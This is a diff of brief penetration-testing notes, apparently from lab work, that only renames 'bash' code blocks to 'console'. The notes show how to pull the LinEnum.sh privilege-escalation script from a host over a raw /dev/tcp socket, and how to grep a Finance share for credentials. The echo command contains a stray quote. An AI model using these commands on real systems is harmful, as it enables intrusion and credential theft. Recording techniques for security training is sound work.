@@ -1,6 +1,6 @@
-######
-Bash
-######
+#######
+console
+#######
 2024-11-28 22:20
 
 Status:
@@ -8,28 +8,28 @@ Status:
 Tags: 
 
 
-Example 1: You can use bash to download a file
+Example 1: You can use console to download a file
 
-.. code-block:: bash
+.. code-block:: console
 
    exec 3<>/dev/tcp/10.10.10.32/80
 
 
 Get the file you need
 
-.. code-block:: bash
+.. code-block:: console
 
    echo -e "GET /LinEnum.sh HTTP/1.1\n\n\">&3
 
 Print the file
 
-.. code-block:: bash
+.. code-block:: console
 
    cat <&3
 
 Example 2: Finding files with a certain string
 
-.. code-block:: bash
+.. code-block:: console
 
    grep -rn /mnt/Finance/ -ie cred
 
